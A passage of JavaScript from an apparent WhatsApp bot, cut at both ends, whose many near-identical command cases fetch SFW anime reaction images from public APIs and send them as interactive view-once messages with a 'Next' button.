          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmug':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeblush':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewave':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmile':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepoke':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewink':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebonk':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebully':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeyeet':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebite':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animelick':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekill':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecry':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewlp':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekiss':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehug':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeneko':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepat':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeslap':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecuddle':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewaifu':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animenom':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefoxgirl':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
